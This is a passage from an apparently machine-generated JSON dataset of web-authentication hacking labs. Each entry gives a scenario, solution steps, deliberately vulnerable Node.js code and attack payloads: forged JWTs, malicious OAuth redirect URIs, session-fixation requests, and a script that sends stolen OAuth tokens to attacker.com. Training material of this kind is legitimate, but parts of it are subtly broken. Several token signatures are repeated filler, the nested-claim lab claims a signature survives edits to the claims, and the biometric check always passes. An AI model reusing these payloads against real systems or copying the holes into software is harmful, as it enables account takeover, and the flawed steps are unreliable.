      "/oauth/authorize?client_id=legitapp&redirect_uri=https://attacker.com&response_type=code",
      "/oauth/authorize?client_id=legitapp&redirect_uri=http://localhost&response_type=token"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth endpoint",
    "Lab Description": "The GraphQL API allows query batching that bypasses rate limiting on authentication attempts. The application processes batched queries sequentially without cumulative rate checks. To solve: brute-force credentials by sending 100 login attempts in a single batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema with introspection query",
      "Craft batch mutation containing multiple login attempts",
      "Use Postman to send JSON array of auth mutations",
      "Identify successful attempt by response differences",
      "Extract valid credentials from the matching response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {ApolloServer, gql} = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): String!}`;const resolvers = {Mutation: {login: (_, {username, password}) => {if (username === 'admin' && password === 'secret') return 'VALID_TOKEN';throw new Error('Invalid credentials');}}};const server = new ApolloServer({typeDefs, resolvers});const app = require('express')();server.applyMiddleware({app});app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess1\\\")}\"},{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess2\\\")}\"}]",
      "[{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass)}\",\"variables\":{\"pass\":\"test\"}}]"
    ]
  },
  {
    "Lab scenario": "Session fixation via subdomain cookie scope",
    "Lab Description": "The application sets session cookies without proper domain restrictions, allowing fixation attacks across subdomains. The vulnerable component accepts pre-set session IDs from untrusted subdomains. To solve: fix a session cookie on a subdomain then trick the victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify cookie-setting behavior with Burp Suite",
      "Craft malicious page on attacker.testdomain.com",
      "Set broad-scope session cookie via JavaScript",
      "Lure victim to attacker-controlled subdomain",
      "Capture authenticated session after victim login"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const cookieParser = require('cookie-parser');const app = express();app.use(cookieParser());app.get('/login', (req, res) => {if (!req.cookies.sessid) res.cookie('sessid', 'RANDOM_VALUE', {domain: '.testdomain.com'});if (req.query.user === 'admin') res.cookie('authenticated', 'true');res.send('Login page');});app.get('/admin', (req, res) => {if (req.cookies.authenticated === 'true') res.send('Sensitive data');else res.status(403).send('Access denied');});app.listen(3000);",
    "payloads": [
      "document.cookie=\"sessid=malicious;domain=.testdomain.com;path=/\"",
      "<iframe src=\"//attacker.testdomain.com/setcookie.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side state validation. The application fails to verify server-side that the same device completes both authentication steps. To solve: initiate MFA on attacker device then complete on victim device by copying state parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial auth request with OWASP ZAP",
      "Note state and nonce parameters in MFA initiation",
      "Inject parameters into victim's active session",
      "Bypass MFA by reusing valid state values",
      "Access account before token expiration"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/mfa/initiate', (req, res) => {const state = Math.random().toString(36).substring(2);const nonce = Math.random().toString(36).substring(2);sessions[state] = {nonce, verified: false};res.json({state, nonce});});app.post('/mfa/verify', (req, res) => {const {state, nonce} = req.body;if (sessions[state] && sessions[state].nonce === nonce) {sessions[state].verified = true;res.json({success: true});} else {res.status(400).json({error: 'Invalid state'});}});app.get('/account', (req, res) => {if (sessions[req.query.state]?.verified) res.send('Account data');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "{\"state\":\"stolen_state\",\"nonce\":\"stolen_nonce\"}",
      "/account?state=compromised_state_value"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice auth",
    "Lab Description": "The JWT validation service improperly processes kid header values, allowing local file inclusion. The application blindly trusts the kid parameter to load verification keys. To solve: forge a valid admin token by forcing the system to use a predictable local file as the verification key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow with Burp Suite to capture JWT structure",
      "Modify kid header to point to /dev/null or known static file",
      "Craft token with HS256 algorithm and simple known-key signature",
      "Bypass verification using file path traversal in kid parameter",
      "Access admin API endpoint with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const validateToken = (token) => {const header = jwt.decode(token, {complete: true}).header;const key = fs.readFileSync(header.kid || 'keys/default.pem');return jwt.verify(token, key);};app.get('/admin', (req, res) => {try {const user = validateToken(req.headers.authorization);if (user.role === 'admin') res.send('Sensitive data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.dBj3d3g6JZX6X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJyb2xlIjoiYWRtaW4ifQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter injection",
    "Lab Description": "The OAuth implementation fails to properly bind state parameters to session contexts. The application accepts valid tokens with mismatched state values. To solve: intercept another user's OAuth flow and swap their authorization code into your session while maintaining your original state parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and capture state parameter with OWASP ZAP",
      "Intercept victim's authorization callback using proxy",
      "Modify callback to maintain original state but victim's code",
      "Complete OAuth flow with swapped credentials",
      "Access victim's resources through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};const oauthTokens = {};app.get('/oauth/callback', (req, res) => {const {code, state} = req.query;if (!sessions[state]) return res.status(400).send('Invalid state');oauthTokens[state] = code;res.redirect('/welcome?state='+state);});app.get('/exchange', (req, res) => {const token = oauthTokens[req.query.state];if (token) res.json({access_token: 'VALID_'+token});else res.status(401).send('Invalid code');});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/exchange?state=ATTACKER_STATE"
    ]
  },
  {
    "Lab scenario": "Session prediction via JTI collision in JWT revocation",
    "Lab Description": "The JWT revocation system uses predictable jti claims that can be brute-forced. The application fails to properly randomize unique token identifiers. To solve: predict valid jti values for active sessions and bypass token revocation checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture multiple JWTs to analyze jti pattern with jwt.io",
      "Identify incremental jti generation pattern",
      "Use Burp Intruder to brute-force valid jti ranges",
      "Craft token with predicted jti of active admin session",
      "Bypass revocation check and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();let lastJti = 1000;const revoked = new Set();app.post('/login', (req, res) => {lastJti++;const token = jwt.sign({user:req.body.user,jti:lastJti},'secret');res.json({token});});app.get('/admin', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, 'secret');if (revoked.has(decoded.jti)) throw Error();if (decoded.user === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTV9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTZ9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication system has a race window between verification and session update. The application checks MFA status without proper synchronization. To solve: send parallel requests to exploit the time gap between verification and session marking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate MFA flow and capture verification token with Burp",
      "Send 10 concurrent verification requests using Turbo Intruder",
      "Immediately request privileged endpoint during race window",
      "Identify successful bypass when session grants access",
      "Repeat until race condition is triggered"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/verify-mfa', (req, res) => {if (req.body.code === '123456') {setTimeout(() => {sessions[req.body.sessionId].verified = true;}, 500);res.send('Verifying...');}});app.get('/transfer', (req, res) => {if (sessions[req.query.sessionId]?.verified) res.send('Funds transferred');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\r\n\r\nsessionId=race1&code=123456",
      "GET /transfer?sessionId=race1 HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP verb tampering on auth endpoint",
    "Lab Description": "The authentication endpoint processes credentials differently based on HTTP methods. The application fails to properly validate credentials on HEAD requests while still returning valid session cookies. To solve: perform credential stuffing attacks using HEAD requests to bypass rate limiting.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify alternative HTTP methods accepted by auth endpoint with OPTIONS",
      "Capture successful login with POST to analyze cookie setting behavior",
      "Use Burp Intruder to send HEAD requests with credential list",
      "Filter responses for Set-Cookie headers indicating success",
      "Use stolen session cookies to access accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'admin':'password123'};app.head('/login', (req, res) => {res.set('Set-Cookie', 'session=HEAD_BYPASS');res.end();});app.post('/login', (req, res) => {if (users[req.body.user] === req.body.pass) {res.cookie('session', 'VALID_SESSION');res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.get('/admin', (req, res) => {if (req.cookies.session === 'VALID_SESSION') res.send('Admin panel');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=password123",
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=guess1"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON objects",
    "Lab Description": "The JWT parser incorrectly processes nested JSON objects in claims, allowing privilege escalation. The application fails to properly validate claim structures when performing authorization checks. To solve: inject nested role objects to bypass admin checks while maintaining valid signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Modify payload to include nested role object: {\"role\":{\"name\":\"admin\"}}",
      "Maintain original signature while adding nested claims",
      "Submit modified token to admin API endpoints",
      "Verify access to restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const payload = jwt.verify(token, 'secret');if (payload.role?.name === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');});app.post('/login', (req, res) => {const token = jwt.sign({user:req.body.user,role:'user'},'secret');res.json({token});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOnsibmFtZSI6ImFkbWluIn19.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7Im5hbWUiOiJhZG1pbiJ9fQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe communication that bypasses CSP protections. The application fails to properly validate message origins in postMessage handlers. To solve: craft malicious page that extracts tokens via iframe contentWindow communication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with malicious postMessage listener",
      "Embed OAuth iframe with allow-same-origin",
      "Exfiltrate tokens via cross-frame JavaScript calls",
      "Use stolen tokens to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self'\");res.send(`<script>window.addEventListener('message',e=>{window.parent.postMessage({token:'SECRET_TOKEN'},'*')})</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" onload=\"this.contentWindow.postMessage('','*')\"></iframe>",
      "<script>window.addEventListener('message',e=>{fetch('https://attacker.com?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The application establishes sessions through WebSocket connections before authentication. The WebSocket handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WS connection then authenticate to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebSocket session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const sessions = {};const wss = new WebSocket.Server({ noServer: true });wss.on('connection', (ws, req) => {const sessionId = req.headers['session-id'];ws.session = sessions[sessionId] || {};});app.post('/login', (req, res) => {const sessionId = Math.random().toString(36);sessions[sessionId] = { user: req.body.user };res.json({ sessionId });});const server = app.listen(3000);server.on('upgrade', (req, socket, head) => {wss.handleUpgrade(req, socket, head, (ws) => {wss.emit('connection', ws, req);});});",
    "payloads": [
      "GET /chat HTTP/1.1\r\nHost: vulnerable.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSession-ID: FIXATED_ID\r\n\r\n",
      "wss://vulnerable.com/chat -H \"Session-ID: FIXATED_ID\""
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited backup code reuse",
    "Lab Description": "The multi-factor authentication system improperly validates backup codes, allowing unlimited reuse within the expiration window. The application fails to track used backup codes in real-time. To solve: intercept valid backup code and reuse it before server-side invalidation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture backup code during legitimate MFA flow using Burp",
      "Immediately reuse captured code in parallel session",
      "Bypass MFA before backend validation completes",
      "Maintain authenticated session after code expiration",
      "Access protected resources before session timeout"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const usedCodes = new Set();app.post('/verify-backup', (req, res) => {const { code } = req.body;setTimeout(() => usedCodes.add(code), 10000);if (code === '123456') res.json({ verified: true });else res.status(400).json({ error: 'Invalid code' });});app.listen(3000);",
    "payloads": [
      "{\"code\":\"123456\"}",
      "{\"code\":\"123456\",\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive password comparison",
    "Lab Description": "The authentication system performs case-insensitive password comparison, reducing effective password entropy. The application converts all passwords to lowercase before comparison. To solve: perform credential stuffing with case variations of known passwords.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case-insensitive behavior via error messages with Postman",
      "Load known password lists into Burp Intruder",
      "Configure payload processing to generate case variations",
      "Launch attack with all case permutations",
      "Identify successful authentication attempts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = { 'admin': { password: 'Secret123' } };app.post('/login', (req, res) => {const user = users[req.body.user];if (user && user.password.toLowerCase() === req.body.pass.toLowerCase()) {res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"secret123\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation endpoint improperly processes jwk header parameters, allowing attackers to specify their own verification keys. The application fails to validate the origin of supplied keys. To solve: forge a valid admin token by injecting a malicious jwk header with attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Generate RSA key pair using OpenSSL",
      "Craft token with jwk header containing public key",
      "Sign token with corresponding private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const token = req.body.token;const decoded = jwt.decode(token, {complete: true});const key = decoded.header.jwk ? jwt.verify(token, decoded.header.jwk) : jwt.verify(token, 'SECRET_KEY');if (key.role === 'admin') res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhYWCJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri wildcards",
    "Lab Description": "The OAuth implementation accepts overly permissive redirect_uri values containing wildcards, allowing token interception. The application fails to properly validate redirect URLs against registered patterns. To solve: steal authorization codes by registering malicious callback endpoint matching wildcard pattern.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth client registration endpoint using OWASP ZAP",
      "Register client with redirect_uri containing * wildcard",
      "Initiate auth flow with attacker-controlled subdomain",
      "Intercept authorization code in redirect",
      "Exchange code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {};app.post('/register', (req, res) => {const clientId = Math.random().toString(36);clients[clientId] = {redirect_uri: req.body.redirect_uri};res.json({clientId});});app.get('/auth', (req, res) => {const client = clients[req.query.client_id];if (req.query.redirect_uri.startsWith(client.redirect_uri.replace('*',''))) {res.redirect(`${req.query.redirect_uri}?code=AUTH_CODE`);} else {res.status(400).send('Invalid redirect');}});app.listen(3000);",
    "payloads": [
      "{\"redirect_uri\":\"https://*.attacker.com/callback\"}",
      "/auth?client_id=CLIENT_ID&redirect_uri=https://evil.attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header compression",
    "Lab Description": "The application assigns session IDs based on HTTP/2 header values that can be manipulated through compression contexts. The server fails to reset compression contexts between connections. To solve: fixate session ID by manipulating HPACK header compression state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish multiple HTTP/2 connections using Burp Suite",
      "Analyze session assignment patterns",
      "Craft requests that manipulate HPACK state",
      "Fixate predictable session ID",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key: fs.readFileSync('key.pem'),cert: fs.readFileSync('cert.pem')});const sessions = {};server.on('stream', (stream, headers) => {const sessionId = headers['x-custom-header'] || Math.random().toString(36);sessions[sessionId] = headers;stream.respond({'content-type': 'text/html'});stream.end(`Session ${sessionId}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\r\nHost: vulnerable.com\r\nx-custom-header: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter reflection",
    "Lab Description": "The multi-factor authentication flow reflects unvalidated state parameters in successful responses. The application fails to maintain server-side state validation. To solve: bypass MFA by injecting arbitrary state parameters that get reflected back after verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify state parameter to admin=true",
      "Complete MFA verification normally",
      "Capture reflected state in success response",
      "Access privileged functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/mfa/start', (req, res) => {res.cookie('mfa_state', req.query.state || 'user');res.send('Verification required');});app.post('/mfa/verify', (req, res) => {const state = req.cookies.mfa_state;res.json({status: 'verified', state});});app.listen(3000);",
    "payloads": [
      "/mfa/start?state=admin",
      "{\"status\":\"verified\",\"state\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password hash timing leak",
    "Lab Description": "The authentication system leaks valid usernames through password hash comparison timing differences. The application uses insecure string comparison for password hashes. To solve: enumerate valid users via timing attacks then perform targeted credential stuffing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure response times for login attempts using OWASP ZAP",
      "Identify username candidates showing timing variations",
      "Perform statistical analysis of response times",
      "Confirm valid users through timing patterns",
      "Execute targeted password attacks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const crypto = require('crypto');const app = express();const users = {'admin':'5f4dcc3b5aa765d61d8327deb882cf99'};app.post('/login', (req, res) => {const user = users[req.body.user];if (!user) return res.status(401).send('Invalid user');const inputHash = crypto.createHash('md5').update(req.body.pass).digest('hex');let match = true;for (let i = 0; i < user.length; i++) {if (user[i] !== inputHash[i]) match = false;}if (match) res.send('Logged in');else res.status(401).send('Invalid pass');});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"password\"}",
      "{\"user\":\"guest\",\"pass\":\"password\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via x5u header injection",
    "Lab Description": "The JWT validation endpoint improperly processes x5u header parameters, allowing algorithm confusion attacks. The application fails to validate certificate chain when loading verification keys from URLs. To solve: forge a valid admin token by injecting malicious x5u header pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Host spoofed X.509 certificate on attacker server",
      "Craft token with x5u header pointing to malicious cert",
      "Sign token with RS256 using corresponding private key",
      "Submit forged token to bypass admin checks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.post('/verify', async (req, res) => {const token = req.body.token;const header = jwt.decode(token, {complete: true}).header;const key = header.x5u ? (await axios.get(header.x5u)).data : 'SECRET_KEY';jwt.verify(token, key);if (jwt.decode(token).role === 'admin') res.send('Admin access');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe referrer policy",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe referrer policies. The application fails to set proper referrer policies on iframe elements containing sensitive tokens. To solve: exfiltrate OAuth tokens by crafting malicious page that reads iframe document.referrer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with iframe pointing to OAuth endpoint",
      "Exploit missing referrer policy to read token from referrer header",
      "Capture token when victim visits malicious page",
      "Use stolen token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.send(`<script>window.location='https://vulnerable.com/callback?token=SECRET'</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" id=\"leak\"></iframe><script>setTimeout(()=>alert(document.getElementById('leak').contentDocument.referrer),1000)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport protocol",
    "Lab Description": "The application establishes sessions through WebTransport connections before authentication. The WebTransport handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WebTransport connection then authenticate to hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport handshake with specialized proxy",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const server = new WebTransport({ port: 443 });const sessions = {};server.on('session', (session) => {const sessionId = session.headers['session-id'];session.socket = sessions[sessionId] || {};});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: vulnerable.com\r\nSession-ID: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The multi-factor authentication system accepts replayed biometric verification data. The application fails to implement proper anti-replay protections for biometric authentication. To solve: intercept valid biometric data during authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture biometric authentication data with MITM proxy",
      "Analyze biometric data format and parameters",
      "Replay captured biometric data in new session",
      "Bypass MFA requirement with replayed data",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const biometricData = [];app.post('/verify-biometric', (req, res) => {biometricData.push(req.body.data);if (biometricData.includes(req.body.data)) res.json({verified:true});else res.status(403).json({error:'Verification failed'});});app.listen(3000);",
    "payloads": [
      "{\"data\":\"BASE64_BIOMETRIC_SAMPLE\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system improperly reuses HTTP/3 connections for different users. The application fails to properly isolate connection contexts between authentication attempts. To solve: perform credential stuffing by reusing established HTTP/3 connection across multiple authentication attempts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/3 connection to target using specialized client",
      "Perform legitimate login to establish connection state",
      "Reuse same connection for credential stuffing attempts",
      "Bypass rate limits through connection persistence",
      "Identify successful authentication responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const server = http3.createServer();const connections = new Map();server.on('stream', (stream) => {const connId = stream.session.id;if (!connections.has(connId)) connections.set(connId, {auth: false});const state = connections.get(connId);if (stream.headers[':path'] === '/login') {state.auth = (stream.headers['password'] === 'correct');}if (state.auth) stream.respond({':status': 200});else stream.respond({':status': 401});});server.listen(443);",
    "payloads": [
      "GET /login HTTP/3\r\nHost: vulnerable.com\r\npassword: guess1\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JSON Web Tokens with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for the admin user by exploiting this vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user session request with Burp Suite to capture a sample JWT",
      "Decode the JWT using jwt.io and observe the structure and claims",
      "Modify the algorithm header to 'none' and change the username claim to 'admin'",
      "Remove the signature portion of the JWT (after the second dot)",
      "Submit the modified token in an authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const users = {'user1':'pass123','admin':'admin123'};app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]&&users[username]===password){const token=jwt.sign({user:username},'weaksecret',{algorithm:'HS256'});res.json({token});}else{res.status(401).send('Invalid credentials');}});app.get('/admin',(req,res)=>{try{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.header.alg==='none'){const user=decoded.payload.user;if(user==='admin'){res.send('Admin access granted');}}}catch(e){res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "GraphQL query depth exploitation",
    "Lab Description": "The GraphQL endpoint lacks proper depth limiting controls, allowing recursive queries that can lead to denial of service or data leakage. The application processes nested queries without restrictions. To solve: craft a recursive query to extract all user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send introspection queries to identify available schema types",
      "Discover user-related types and their relationships using __schema queries",
      "Construct a deeply nested query that recursively follows user relationships",
      "Use query batching to send multiple recursive queries in parallel",
      "Extract sensitive user data from the responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type User { id: ID! username: String! friends: [User] }type Query { getUser(id: ID!): User }`);const root = {getUser: ({id}) => db.getUser(id)};const app = express();app.use('/graphql', graphqlHTTP({schema,rootValue: root,graphiql: true}));app.listen(4000);",
    "payloads": [
      "query { getUser(id: \"1\") { username friends { username friends { username friends { username } } } }",
      "query { __schema { types { name fields { name type { name } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URIs during token exchange. To solve: steal an OAuth token by crafting a malicious redirect URI and use it to authenticate as another user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite to identify callback parameters",
      "Modify the redirect_uri parameter to point to an attacker-controlled domain",
      "Trick a user into initiating OAuth with the malicious redirect URI",
      "Capture the authorization code or token from the redirect",
      "Exchange the code for an access token and authenticate as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {'client1':{secret:'sec123',redirectURIs:['https://client1.com/callback']}};app.get('/oauth/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){res.redirect(`${redirect_uri}?code=rand123`);}});app.post('/oauth/token',(req,res)=>{const{client_id,client_secret,code}=req.body;if(clients[client_id]&&clients[client_id].secret===client_secret){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://client1.com.evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via JWT in URL fragment",
